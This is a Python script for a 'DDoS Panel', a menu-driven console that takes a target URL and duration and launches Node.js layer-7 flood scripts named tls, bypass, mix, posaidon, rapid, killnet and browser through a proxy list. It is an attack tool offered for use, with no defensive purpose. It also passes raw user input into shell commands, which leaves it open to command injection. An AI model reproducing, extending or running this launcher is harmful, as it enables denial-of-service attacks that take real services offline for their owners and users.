import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To DDoS Panel | User: root | Plan: VIP | Proxy: " + bots_str + " | Happy"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.yellow_to_red, ''' 
            LIST LAYER7
            
TLS
BYPASS
MIX
POSAIDON
RAPID
KILLNET
BROWSER

HOW TO USE
TLS https://example.com 120
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To DDoS Panel | User: root | Plan: VIP | Proxy: " + bots_str + " | Happy"))
    print("")
    banner = '''
Type Layer7 To See Layer7⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.yellow_to_red, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, "root#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node tls {host} {time} 24 4 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node bypass {host} {time} 4 proxy.txt 24 uam')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "MIX" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node mix {host} {time} 24 4')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "POSAIDON" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node posaidon {host} {time} 24 4 proxy.txt')
                os.system(f'node posaidon {host} {time} 24 4 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node rapid GET {time} 4 proxy.txt 24 {host}')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "KILLNET" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node killnet {host} {time} 24 4 GET proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BROWSER" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node browser {host} {time} 24 4 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.yellow_to_red, ''' 
LAYER7 - SEE ALL LAYER7
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = ""
    passwd = ""
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("Password/Username Salah")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome To DDoS Panel")
        time.sleep(0.3)
        main()
login()
